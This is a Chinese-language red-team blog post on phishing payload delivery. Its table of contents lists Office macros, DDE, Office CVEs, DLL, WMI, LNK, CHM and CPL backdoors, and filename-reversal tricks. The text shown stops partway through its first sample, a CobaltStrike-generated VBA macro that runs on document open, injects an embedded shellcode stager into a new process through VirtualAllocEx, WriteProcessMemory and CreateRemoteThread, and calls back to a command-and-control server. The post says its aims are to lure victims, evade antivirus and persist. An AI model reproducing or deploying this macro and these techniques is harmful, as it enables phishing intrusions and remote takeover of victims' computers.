<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Phishing Attack - æ–‡ä»¶è½åœ° | Patrilic's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Phishing Attack - æ–‡ä»¶è½åœ°</h1><a id="logo" href="/.">Patrilic's blog</a><p class="description">ä¸å¿˜åˆå¿ƒ</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> é¦–é¡µ</i></a><a href="/archives/"><i class="fa fa-archive"> å½’æ¡£</i></a><a href="/2019/04/01/Hello/"><i class="fa fa-user"> å…³äº</i></a><a href="/atom.xml"><i class="fa fa-rss"> è®¢é˜…</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Phishing Attack - æ–‡ä»¶è½åœ°</h1><div class="post-meta">Jul 18, 2019<span> | </span><span class="category"><a href="/categories/Red-Team-Tricks/">Red-Team Tricks</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> é˜…è¯»</span></span></div><a class="disqus-comment-count" data-disqus-identifier="2019/07/18/Phishing Attack - æ–‡ä»¶è½åœ°/" href="/2019/07/18/Phishing Attack - æ–‡ä»¶è½åœ°/#disqus_thread"></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">æ–‡ç« ç›®å½•</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-Office"><span class="toc-number">1.</span> <span class="toc-text">0x00 Office</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Office-Macro"><span class="toc-number">1.1.</span> <span class="toc-text">Office Macro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Office-DDE"><span class="toc-number">1.2.</span> <span class="toc-text">Office DDE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Excel-IQY"><span class="toc-number">1.3.</span> <span class="toc-text">Excel IQY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OLE"><span class="toc-number">1.4.</span> <span class="toc-text">OLE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNCè·¯å¾„"><span class="toc-number">1.5.</span> <span class="toc-text">UNCè·¯å¾„</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powerpoint-Button"><span class="toc-number">1.6.</span> <span class="toc-text">Powerpoint Button</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-0199"><span class="toc-number">1.7.</span> <span class="toc-text">CVE-2017-0199</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-8570"><span class="toc-number">1.8.</span> <span class="toc-text">CVE-2017-8570</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Notepad-dllåé—¨"><span class="toc-number">2.</span> <span class="toc-text">0x01 Notepad++ dllåé—¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JSRAT"><span class="toc-number">3.</span> <span class="toc-text">0x02 JSRAT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#åˆ©ç”¨DLL-åŠ è½½-JS"><span class="toc-number">3.1.</span> <span class="toc-text">åˆ©ç”¨DLL åŠ è½½ JS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åˆ©ç”¨-swf-åŠ è½½-JS"><span class="toc-number">3.2.</span> <span class="toc-text">åˆ©ç”¨ swf åŠ è½½ JS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åˆ©ç”¨-æµè§ˆå™¨æ¼æ´-åŠ è½½-JS"><span class="toc-number">3.3.</span> <span class="toc-text">åˆ©ç”¨ æµè§ˆå™¨æ¼æ´ åŠ è½½ JS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åˆ©ç”¨-VBS-åŠ è½½-JS"><span class="toc-number">3.4.</span> <span class="toc-text">åˆ©ç”¨ VBS åŠ è½½ JS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åˆ©ç”¨-CHM-åŠ è½½-JS"><span class="toc-number">3.5.</span> <span class="toc-text">åˆ©ç”¨ CHM åŠ è½½ JS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ç”Ÿæˆ-Shellcode"><span class="toc-number">3.6.</span> <span class="toc-text">ç”Ÿæˆ Shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-WSC"><span class="toc-number">4.</span> <span class="toc-text">0x03 WSC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-WMI-Backdoor"><span class="toc-number">5.</span> <span class="toc-text">0x04 WMI Backdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell-åˆ©ç”¨"><span class="toc-number">5.0.1.</span> <span class="toc-text">powershell åˆ©ç”¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell-è°ƒç”¨-javascript-backdoor"><span class="toc-number">5.0.2.</span> <span class="toc-text">powershell è°ƒç”¨ javascript_backdoor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mof-è°ƒç”¨-javascript-backdoor"><span class="toc-number">5.0.3.</span> <span class="toc-text">mof è°ƒç”¨ javascript_backdoor</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Lnk-Backdoor"><span class="toc-number">6.</span> <span class="toc-text">0x05 Lnk Backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Chm-Backdoor"><span class="toc-number">7.</span> <span class="toc-text">0x06 Chm Backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-CPL-Backdoor"><span class="toc-number">8.</span> <span class="toc-text">0x07 CPL Backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Windows-åˆ©ç”¨Unicode-æ–‡ä»¶ååè½¬"><span class="toc-number">9.</span> <span class="toc-text">0x08 Windows åˆ©ç”¨Unicode æ–‡ä»¶ååè½¬</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-Winrar-Backdoor"><span class="toc-number">10.</span> <span class="toc-text">0x09 Winrar Backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-CVE-2018-4878"><span class="toc-number">11.</span> <span class="toc-text">0x10 CVE-2018-4878</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-Nginx-åå‘ä»£ç†"><span class="toc-number">12.</span> <span class="toc-text">0x11 Nginx åå‘ä»£ç†</span></a></li></div></div><div class="post-content"><blockquote>
<p>@Author: Patrilic<br>@Time: 2019-07-18 11:20:33<br><img src="/wallpaper/[39567]Good Morning-54191467.png" alt><br>[toc]<br>é±¼å‰æ”»å‡»ï¼Œä½œä¸ºä¸€ç§å¸¸è§çš„æ”»å‡»å½¢å¼ï¼Œä¸­å¿ƒæ€æƒ³å°±æ˜¯å°†shellcodeä»¥å„ç§å½¢å¼è¿›è¡Œä¼ªè£…ï¼Œç„¶åè¯±ä½¿å—å®³è€…å¯åŠ¨ç¨‹åºï¼Œåˆ©ç”¨C2æœåŠ¡å™¨è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p>
</blockquote>
<p>é±¼å‰æ”»å‡»çš„éš¾ç‚¹ï¼š</p>
<ol>
<li>ä¿¡ä»»ä¼ªé€  â€“ å¸¸è§çš„æœ‰swaksä¼ªé€ é‚®ä»¶ï¼ŒDNSåŠ«æŒï¼Œæ”¹å†™è¢«ä¿¡ä»»ç½‘ç«™ç­‰</li>
<li>å…æ€ â€“ èƒ½è§„é¿å¸‚é¢ä¸Šå¤§å¤šæ•°æ€æ¯’è½¯ä»¶ï¼Œä¸è¢«å‘ç°</li>
<li>ç»´æŒè¿›ç¨‹ â€“ é•¿æœŸæ§åˆ¶ï¼Œï¼Œå¼€æœºè‡ªå¯</li>
<li>ä¸æš´éœ² â€“ ä¸è½åœ°ï¼Œä¾é™„è¿›ç¨‹ï¼Œcertutilç­‰</li>
</ol>
<p>æœ¬æ–‡æ„åœ¨æ€»ç»“ä¸€äº›è¾ƒä¸ºå¸¸è§çš„åˆ©ç”¨æ–¹å¼ï¼Œä¸æ˜¯å¾ˆæ³¨é‡æ–‡ç¬”ï¼Œçœ‹çœ‹å°±å¥½ï¼Œä¸€äº›è„šæœ¬æ˜¯ç›´æ¥copyå¤§æ‰‹å­<code>@3gstudent</code>å¸ˆå‚…çš„ï¼Œç„¶åå…³äºç±»ä¼¼ä¸<code>CobaltStrike</code>çš„Spear phishä»¥åŠNginxçš„ç©æ³•ï¼Œå•ç‹¬è¿›è¡Œæ€»ç»“</p>
<h2 id="0x00-Office"><a href="#0x00-Office" class="headerlink" title="0x00 Office"></a>0x00 Office</h2><h3 id="Office-Macro"><a href="#Office-Macro" class="headerlink" title="Office Macro"></a>Office Macro</h3><p>Officeæ–‡æ¡£å†…ç½®å®ï¼Œå¯åˆ©ç”¨VBè¿œç¨‹å‘½ä»¤æ‰§è¡Œå›å¼¹åˆ°C2æœåŠ¡å™¨<br>ğŸ‘‡ç”±CobaltStrikeç”Ÿæˆçš„Macroç—…æ¯’æ ·æœ¬<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/6A9FD69F-ED50-4060-93AA-726501F481E2.png" alt="0ea9ced974025abd297e31f79a2624bb"></p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> Type PROCESS_INFORMATION</span><br><span class="line">    hProcess <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hThread <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwProcessId <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwThreadId <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> Type STARTUPINFO</span><br><span class="line">    cb <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    lpReserved <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    lpDesktop <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    lpTitle <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    dwX <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwY <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwXSize <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwYSize <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwXCountChars <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwYCountChars <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwFillAttribute <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwFlags <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    wShowWindow <span class="keyword">As</span> <span class="built_in">Integer</span></span><br><span class="line">    cbReserved2 <span class="keyword">As</span> <span class="built_in">Integer</span></span><br><span class="line">    lpReserved2 <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdInput <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdOutput <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdError <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> VBA7 Then</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CreateStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateRemoteThread"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpThreadAttributes <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwStackSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpStartAddress <span class="keyword">As</span> LongPtr, lpParameter <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpThreadID <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> AllocStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"VirtualAllocEx"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpAddr <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flAllocationType <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flProtect <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> WriteStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"WriteProcessMemory"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lDest <span class="keyword">As</span> LongPtr, <span class="keyword">ByRef</span> Source <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Length <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> LengthWrote <span class="keyword">As</span> LongPtr) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> RunStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateProcessA"</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="built_in">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="built_in">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDirectory <span class="keyword">As</span> <span class="built_in">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> CreateStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateRemoteThread"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpThreadAttributes <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwStackSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpStartAddress <span class="keyword">As</span> <span class="built_in">Long</span>, lpParameter <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpThreadID <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> AllocStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"VirtualAllocEx"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpAddr <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flAllocationType <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flProtect <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> WriteStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"WriteProcessMemory"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lDest <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByRef</span> Source <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Length <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> LengthWrote <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> RunStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateProcessA"</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="built_in">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="built_in">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDriectory <span class="keyword">As</span> <span class="built_in">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">End</span> <span class="meta-keyword">If</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    <span class="keyword">Dim</span> pInfo <span class="keyword">As</span> PROCESS_INFORMATION</span><br><span class="line">    <span class="keyword">Dim</span> sInfo <span class="keyword">As</span> STARTUPINFO</span><br><span class="line">    <span class="keyword">Dim</span> sNull <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    <span class="keyword">Dim</span> sProc <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> VBA7 Then</span></span><br><span class="line">    <span class="keyword">Dim</span> rwxpage <span class="keyword">As</span> LongPtr, res <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">    <span class="keyword">Dim</span> rwxpage <span class="keyword">As</span> <span class="built_in">Long</span>, res <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">End</span> <span class="meta-keyword">If</span></span></span><br><span class="line">    myArray = Array(<span class="number">-4</span>,<span class="number">-24</span>,<span class="number">-119</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">-119</span>,<span class="number">-27</span>,<span class="number">49</span>,<span class="number">-46</span>,<span class="number">100</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">48</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">12</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">20</span>,<span class="number">-117</span>,<span class="number">114</span>,<span class="number">40</span>,<span class="number">15</span>,<span class="number">-73</span>,<span class="number">74</span>,<span class="number">38</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">49</span>,<span class="number">-64</span>,<span class="number">-84</span>,<span class="number">60</span>,<span class="number">97</span>,<span class="number">124</span>,<span class="number">2</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">-63</span>,<span class="number">-49</span>, _</span><br><span class="line"><span class="number">13</span>,<span class="number">1</span>,<span class="number">-57</span>,<span class="number">-30</span>,<span class="number">-16</span>,<span class="number">82</span>,<span class="number">87</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">16</span>,<span class="number">-117</span>,<span class="number">66</span>,<span class="number">60</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">-117</span>,<span class="number">64</span>,<span class="number">120</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">116</span>,<span class="number">74</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">80</span>,<span class="number">-117</span>,<span class="number">72</span>,<span class="number">24</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">-29</span>,<span class="number">60</span>,<span class="number">73</span>,<span class="number">-117</span>,<span class="number">52</span>,<span class="number">-117</span>,<span class="number">1</span>, _</span><br><span class="line"><span class="number">-42</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">49</span>,<span class="number">-64</span>,<span class="number">-84</span>,<span class="number">-63</span>,<span class="number">-49</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">-57</span>,<span class="number">56</span>,<span class="number">-32</span>,<span class="number">117</span>,<span class="number">-12</span>,<span class="number">3</span>,<span class="number">125</span>,<span class="number">-8</span>,<span class="number">59</span>,<span class="number">125</span>,<span class="number">36</span>,<span class="number">117</span>,<span class="number">-30</span>,<span class="number">88</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">102</span>,<span class="number">-117</span>,<span class="number">12</span>,<span class="number">75</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">28</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">-117</span>,<span class="number">4</span>, _</span><br><span class="line"><span class="number">-117</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">-119</span>,<span class="number">68</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">91</span>,<span class="number">91</span>,<span class="number">97</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">81</span>,<span class="number">-1</span>,<span class="number">-32</span>,<span class="number">88</span>,<span class="number">95</span>,<span class="number">90</span>,<span class="number">-117</span>,<span class="number">18</span>,<span class="number">-21</span>,<span class="number">-122</span>,<span class="number">93</span>,<span class="number">104</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">104</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">84</span>,<span class="number">104</span>,<span class="number">76</span>,<span class="number">119</span>,<span class="number">38</span>,<span class="number">7</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-43</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">58</span>,<span class="number">86</span>,<span class="number">121</span>,<span class="number">-89</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-23</span>,<span class="number">-124</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">91</span>,<span class="number">49</span>,<span class="number">-55</span>,<span class="number">81</span>,<span class="number">81</span>,<span class="number">106</span>,<span class="number">3</span>,<span class="number">81</span>,<span class="number">81</span>,<span class="number">104</span>,<span class="number">-46</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">87</span>,<span class="number">-119</span>,<span class="number">-97</span>, _</span><br><span class="line"><span class="number">-58</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-21</span>,<span class="number">112</span>,<span class="number">91</span>,<span class="number">49</span>,<span class="number">-46</span>,<span class="number">82</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">64</span>,<span class="number">-124</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">82</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">-21</span>,<span class="number">85</span>,<span class="number">46</span>,<span class="number">59</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-119</span>,<span class="number">-58</span>,<span class="number">-125</span>,<span class="number">-61</span>,<span class="number">80</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">106</span>,<span class="number">-1</span>,<span class="number">83</span>,<span class="number">86</span>, _</span><br><span class="line"><span class="number">104</span>,<span class="number">45</span>,<span class="number">6</span>,<span class="number">24</span>,<span class="number">123</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">15</span>,<span class="number">-124</span>,<span class="number">-61</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">-123</span>,<span class="number">-10</span>,<span class="number">116</span>,<span class="number">4</span>,<span class="number">-119</span>,<span class="number">-7</span>,<span class="number">-21</span>,<span class="number">9</span>,<span class="number">104</span>,<span class="number">-86</span>,<span class="number">-59</span>,<span class="number">-30</span>,<span class="number">93</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-119</span>,<span class="number">-63</span>,<span class="number">104</span>,<span class="number">69</span>,<span class="number">33</span>,<span class="number">94</span>,<span class="number">49</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-43</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">106</span>,<span class="number">7</span>,<span class="number">81</span>,<span class="number">86</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">-73</span>,<span class="number">87</span>,<span class="number">-32</span>,<span class="number">11</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-65</span>,<span class="number">0</span>,<span 